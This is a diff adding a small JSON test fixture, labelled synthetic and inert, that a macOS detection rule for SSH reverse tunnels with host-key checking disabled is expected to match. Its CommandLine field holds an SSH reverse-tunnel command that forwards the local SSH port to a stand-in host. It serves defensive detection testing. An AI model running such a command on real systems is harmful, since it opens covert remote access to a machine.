@@ -1,0 +1,12 @@
+{
+  "_seraph": {
+    "classification": "synthetic-benign",
+    "note": "Inert SERAPH fixture. Do not execute. Hosts are example.invalid.",
+    "expected": "match",
+    "rule": "SERAPH_MacOS_SSH_Reverse_Lax_HostKey"
+  },
+  "Image": "/usr/bin/ssh",
+  "ParentImage": "/sbin/launchd",
+  "CommandLine": "ssh -N -R 127.0.0.1:2222:127.0.0.1:22 -o StrictHostKeyChecking=no tunnel@example.invalid",
+  "User": "dev"
+}
